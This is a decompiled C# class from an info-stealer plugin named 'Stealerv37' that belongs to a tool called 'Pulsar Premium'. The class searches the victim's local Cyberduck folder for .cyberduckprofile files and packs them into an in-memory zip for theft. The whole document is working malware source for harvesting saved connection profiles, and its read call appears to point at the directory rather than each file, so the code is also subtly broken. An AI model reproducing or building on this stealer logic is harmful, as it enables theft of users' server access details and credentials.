// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.CyberDuck
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Applications;

public class CyberDuck : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Cyberduck", "Profiles");
    if (!Directory.Exists(path))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (CyberDuck);
    foreach (string file in Directory.GetFiles(path))
    {
      if (file.EndsWith(".cyberduckprofile"))
      {
        string entryPath = "CyberDuck\\" + Path.GetFileName(file);
        zip.AddFile(entryPath, File.ReadAllBytes(path));
        counterApplications.Files.Add($"{file} => {entryPath}");
      }
    }
    counter.Applications.Add(counterApplications);
  }
}
